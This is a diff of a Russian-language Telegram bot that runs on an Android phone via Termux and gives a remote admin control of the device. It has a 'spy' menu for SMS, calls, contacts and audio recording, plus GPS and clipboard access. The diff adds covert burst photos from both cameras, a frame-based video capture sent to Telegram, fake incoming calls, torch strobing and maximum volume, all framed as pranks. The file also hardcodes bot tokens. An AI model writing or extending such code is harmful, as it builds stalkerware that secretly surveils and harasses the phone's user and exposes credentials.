@@ -1,8 +1,8 @@
 import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
-import subprocess, os, json, time, signal, threading
+import subprocess, os, json, time, signal, threading, random
 
-TOKEN = '8733717882:AAHOxAckqRFA_xZG6Zppjqel_KyvbAeXgvg'
+TOKEN = '8733717882:AAFyHqQpFBFVKLOgB6w1WRxqx7_DX9xxg6I'
 ADMIN_ID = 6678107119
 PULT_URL = 'https://raw.githack.com/ggfix666-prog/a51-sc-control/main/prank.html'
 
@@ -27,22 +27,27 @@ def start(message):
         "/list — список треков\n"
         "/play имя — играть\n"
         "/stop — стоп\n"
-        "/volume 50 — громкость\n\n"
+        "/volume 50 — громкость\n"
+        "/loud — громкость максимум\n\n"
         "🔧 <b>СИСТЕМА</b>\n"
         "/say текст — голос\n"
         "/torch on|off — фонарик\n"
+        "/flash 5 — фонарик мигает N раз\n"
+        "/fakecall 15 — имитация звонка\n"
         "/vibrate 5 — вибрация\n"
         "/battery — батарея\n"
         "/photo /selfie — фото\n"
-        "/video 20 — видео задняя (сек)\n"
-        "/selfievideo 20 — видео фронт (сек)\n"
+        "/burst 5 — серия фото задняя\n"
+        "/sburst 5 — серия фото фронт\n"
+        "/video 10 — «видео» задняя (сек)\n"
+        "/selfievideo 10 — «видео» фронт (сек)\n"
         "/location — GPS\n"
         "/clip — буфер\n"
         "/brightness 50 — яркость\n"
         "/notify текст — уведомление\n"
         "/device — модель/Android\n"
         "/silent — беззвучный\n"
-        "/open ссылка — уведомление с кнопкой\n\n"
+        "/open ссылка — открыть ссылку\n\n"
         "🕵️ <b>ШПИОН</b>\n"
         "/sms /calls /contacts\n"
         "/record 10 — запись\n"
@@ -51,6 +56,68 @@ def start(message):
         "/prank /ghost /insane\n\n"
         "Открой «🎮 Пульт» внизу 👇",
         parse_mode='HTML', reply_markup=prank_kb())
+
+# ── ФОНАРИК-МИГАНИЕ ──
+@bot.message_handler(commands=['flash'])
+def flash_cmd(message):
+    p = message.text.split()
+    n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
+    n = min(n, 100)
+    bot.reply_to(message, f"🔦 Мигаю {n} раз...")
+    def _do():
+        for i in range(n):
+            try:
+                subprocess.run(["termux-torch", "on"], check=True)
+                time.sleep(0.15)
+                subprocess.run(["termux-torch", "off"], check=True)
+                time.sleep(0.15)
+            except Exception as e:
+                bot.send_message(message.chat.id, f"❌ {e}")
+                return
+        bot.send_message(message.chat.id, f"✅ Мигнул {n} раз")
+    threading.Thread(target=_do, daemon=True).start()
+
+# ── ИМИТАЦИЯ ВХОДЯЩЕГО ЗВОНКА ──
+@bot.message_handler(commands=['fakecall'])
+def fakecall_cmd(message):
+    p = message.text.split()
+    sec = int(p[1]) if len(p) > 1 and p[1].isdigit() else 15
+    sec = min(sec, 120)
+    bot.reply_to(message, f"📞 Имитирую входящий звонок {sec} сек...")
+    def _do():
+        try:
+            subprocess.run([
+                "termux-notification",
+                "--title", "☎️ Входящий вызов",
+                "--content", "Неизвестный номер",
+                "--sound",
+                "--priority", "max",
+                "--id", "777",
+                "--button1", "Ответить",
+                "--button1-action", "termux-toast 'Ответил'",
+                "--button2", "Отклонить",
+                "--button2-action", "termux-notification-remove 777"
+            ], check=True)
+            end_time = time.time() + sec
+            while time.time() < end_time:
+                subprocess.run(["termux-vibrate", "-d", "2000"])
+                time.sleep(3)
+        except Exception as e:
+            bot.send_message(message.chat.id, f"❌ {e}")
+            return
+        subprocess.run(["termux-notification-remove", "777"])
+        bot.send_message(message.chat.id, "✅ Звонок завершён")
+    threading.Thread(target=_do, daemon=True).start()
+
+# ── LOUD (громкость максимум) ──
+@bot.message_handler(commands=['loud'])
+def loud_cmd(message):
+    bot.reply_to(message, "🔊 Громкость максимум...")
+    try:
+        subprocess.run(["termux-volume", "music", "15"], check=True)
+        bot.send_message(message.chat.id, "✅ Громкость на максимум (15/15)")
+    except Exception as e:
+        bot.reply_to(message, f"❌ {e}")
 
 # ── МУЗЫКА ──
 MUSIC_DIR = '/sdcard/Music'
@@ -207,7 +274,6 @@ def open_cmd(message):
     u = message.text.replace('/open','').strip()
     if not u: bot.reply_to(message, "Напиши: /open https://..."); return
     try:
-        # Уведомление с кнопкой — работает из любого приложения и из фона
         subprocess.run([
             "termux-notification",
             "--title", "🌐 Открыть ссылку",
@@ -272,27 +338,83 @@ def record_cmd(message):
     threading.Thread(target=_do, daemon=True).start()
 
 def _record_video(message, cam_index, sec, label):
-    """Универсальная запись видео через ffmpeg."""
-    path = f"/sdcard/Download/a51_video_{cam_index}.mp4"
+    frames_dir = "/sdcard/Download/a51_frames"
+    out_path   = "/sdcard/Download/a51_video.mp4"
+
     def _do():
         try:
-            if os.path.exists(path): os.remove(path)
+            os.makedirs(frames_dir, exist_ok=True)
+            subprocess.run(f"rm -f {frames_dir}/*.jpg", shell=True)
+            bot.send_message(message.chat.id, f"📷 Снимаю кадры {sec} сек, подожди...")
+            n = 0
+            deadline = time.time() + sec
+            while time.time() < deadline:
+                frame = f"{frames_dir}/f{n:04d}.jpg"
+                subprocess.run(["termux-camera-photo","-c",str(cam_index),frame],
+                    capture_output=True, timeout=10)
+                if os.path.exists(frame): n += 1
+            if n < 2:
+                bot.reply_to(message, "❌ Меньше 2 кадров."); return
             subprocess.run([
                 "ffmpeg", "-y",
-                "-f", "android_camera",
-                "-camera_index", str(cam_index),
-                "-t", str(sec),
-                path
-            ], capture_output=True, timeout=sec+25)
-            if os.path.exists(path) and os.path.getsize(path) > 1000:
-                with open(path,'rb') as f:
-                    bot.send_video(message.chat.id, f, duration=sec, caption=label)
-                os.remove(path)
+                "-framerate", "2",
+                "-i", f"{frames_dir}/f%04d.jpg",
+                "-c:v", "libx264",
+                "-pix_fmt", "yuv420p",
+                "-vf", "scale=1280:-2",
+                out_path
+            ], capture_output=True, timeout=120)
+            if os.path.exists(out_path) and os.path.getsize(out_path) > 500:
+                with open(out_path, 'rb') as f:
+                    bot.send_video(message.chat.id, f, caption=f"{label} ({n} кадров)")
+                os.remove(out_path)
             else:
-                bot.reply_to(message,
-                    "❌ Не записалось. Убедись что ffmpeg установлен:\n"
-                    "pkg install ffmpeg")
-        except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
+                bot.reply_to(message, "❌ ffmpeg не склеил видео.")
+            subprocess.run(f"rm -rf {frames_dir}", shell=True)
+        except Exception as e:
+            bot.reply_to(message, f"❌ {e}")
+    threading.Thread(target=_do, daemon=True).start()
+
+@bot.message_handler(commands=['burst'])
+def burst_cmd(message):
+    p = message.text.split()
+    n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
+    n = min(n, 20)
+    bot.reply_to(message, f"📸 Делаю {n} фото, жди...")
+    def _do():
+        sent = 0
+        for i in range(n):
+            path = f"/sdcard/Download/burst_{i}.jpg"
+            try:
+                subprocess.run(["termux-camera-photo","-c","0",path], capture_output=True, timeout=10)
+                if os.path.exists(path):
+                    with open(path, 'rb') as f:
+                        bot.send_photo(message.chat.id, f)
+                    os.remove(path)
+                    sent += 1
+            except: pass
+        bot.send_message(message.chat.id, f"✅ Готово: {sent}/{n} фото")
+    threading.Thread(target=_do, daemon=True).start()
+
+@bot.message_handler(commands=['sburst'])
+def sburst_cmd(message):
+    p = message.text.split()
+    n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
+    n = min(n, 20)
+    bot.reply_to(message, f"🤳 Селфи-burst {n} фото, жди...")
+    def _do():
+        sent = 0
+        for i in range(n):
+            path = f"/sdcard/Download/sburst_{i}.jpg"
+            try:
+                subprocess.run(["termux-camera-photo","-c","1",path], capture_output=True, timeout=10)
+                if os.path.exists(path):
+                    with open(path, 'rb') as f:
+                        bot.send_photo(message.chat.id, f)
+                    os.remove(path)
+                    sent += 1
+            except: pass
+        bot.send_message(message.chat.id, f"✅ Готово: {sent}/{n} фото")
     threading.Thread(target=_do, daemon=True).start()
 
 @bot.message_handler(commands=['video'])
@@ -340,7 +462,6 @@ def toast_cmd(message):
 @bot.message_handler(commands=['prank'])
 def prank_cmd(message):
     bot.reply_to(message, "🎭 Пранк...")
-    import random
     acts = [
         lambda: subprocess.run(["termux-vibrate","-d","2000"]),
         lambda: subprocess.run(["termux-toast","Я тебя вижу"]),
@@ -372,7 +493,6 @@ def ghost_cmd(message):
 @bot.message_handler(commands=['insane'])
 def insane_cmd(message):
     bot.reply_to(message, "🤪 Безумие...")
-    import random
     try:
         for i in range(5):
             subprocess.run(["termux-vibrate","-d","500"])
@@ -391,8 +511,6 @@ def insane_cmd(message):
 def handle_webapp(message):
     raw = message.web_app_data.data.strip()
     print(f"[WEBAPP] {raw[:80]}")
-    # Формат команд: "/torch on", "/say Привет", "/photo" и т.д.
-    # Просто передаём в обработчик соответствующей команды.
     fake = message
     fake.text = raw
     cmd = raw.split()[0] if raw else ""
@@ -424,8 +542,13 @@ def handle_webapp(message):
         elif cmd == '/play': play_cmd(fake)
         elif cmd == '/stop': stop_cmd(fake)
         elif cmd == '/volume': vol_cmd(fake)
+        elif cmd == '/burst': burst_cmd(fake)
+        elif cmd == '/sburst': sburst_cmd(fake)
         elif cmd == '/video': video_cmd(fake)
         elif cmd == '/selfievideo': selfievideo_cmd(fake)
+        elif cmd == '/flash': flash_cmd(fake)
+        elif cmd == '/fakecall': fakecall_cmd(fake)
+        elif cmd == '/loud': loud_cmd(fake)
         else: bot.send_message(message.chat.id, f"❓ {raw[:40]}")
     except Exception as e:
         print(f"[WEBAPP] ERROR: {e}")
